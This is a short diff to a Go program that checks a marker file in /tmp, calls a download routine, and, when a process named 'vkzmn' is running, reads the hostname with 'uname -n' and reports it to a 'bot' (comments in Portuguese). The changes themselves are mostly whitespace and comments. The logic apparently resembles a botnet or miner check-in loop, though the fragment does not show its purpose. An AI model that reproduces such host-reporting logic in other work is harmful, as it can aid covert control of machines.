@@ -16,6 +16,8 @@ import (
 
 
 
+
+
 func  proc() {
 
 
@@ -32,7 +34,7 @@ for  {
 
         if ret_checktry ==  "try_ok" { down_raw () 
 
-            os.Truncate("/tmp/try_vkzmn",  0 )
+            os.Truncate("/tmp/try_vkzmn",  0 ) //clear file 
    
                return
               
@@ -63,13 +65,6 @@ for  {
 
 
 	}
-
-
-
-
-
-
-
 
 
 
@@ -119,13 +114,18 @@ for  {
 
 
 
+
+
+
 	if vkzmn_ok == 23 {
                      
  
 	
 //vkzmn em execucao
 
+                os.Truncate("/tmp/try_vkzmn", 0) //clear file
 
+                
                 uname := exec.Command("uname" , "-n")
 
  
@@ -140,6 +140,11 @@ for  {
                     bot( msg   ) //notifique o bot 
 
  
+
+
+
+
+
 
 
 	} else {
